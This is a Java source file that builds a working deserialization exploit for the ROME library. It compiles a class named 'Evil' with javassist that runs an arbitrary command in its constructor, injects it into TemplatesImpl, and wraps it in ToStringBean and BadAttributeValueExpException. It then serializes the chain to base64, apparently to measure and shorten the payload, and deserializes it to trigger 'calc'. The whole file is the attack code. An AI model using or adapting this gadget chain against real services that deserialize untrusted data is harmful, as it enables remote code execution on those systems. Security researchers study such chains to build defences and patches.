import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Rome_shorter3 {
    public static byte[] getTemplatesImpl(String cmd) throws NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("Evil");
        CtClass superClass = classPool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = CtNewConstructor.make("    public Evil(){\n" +
            "        try {\n" +
            "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
            "        }catch (Exception ignored){}\n" +
            "    }", ctClass);
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        ctClass.defrost();
        return bytes;
    }
    //设置属性值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static String serialize(Object obj) throws IOException {
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objOutput = new ObjectOutputStream(barr);
        objOutput.writeObject(obj);
        byte[] bytes = barr.toByteArray();
        objOutput.close();
        return Base64.getEncoder().encodeToString(bytes);
    }
    public static void unserialize(String code) throws IOException, ClassNotFoundException {
        byte[] decode = Base64.getDecoder().decode(code);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{getTemplatesImpl("calc")});
        setFieldValue(templates, "_name", "a");

        ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
        setFieldValue(badAttributeValueExpException, "val", toStringBean);

        String s = serialize(badAttributeValueExpException);
        System.out.println(s);
        System.out.println("长度为：" + s.length());
        unserialize(s);
    }
}
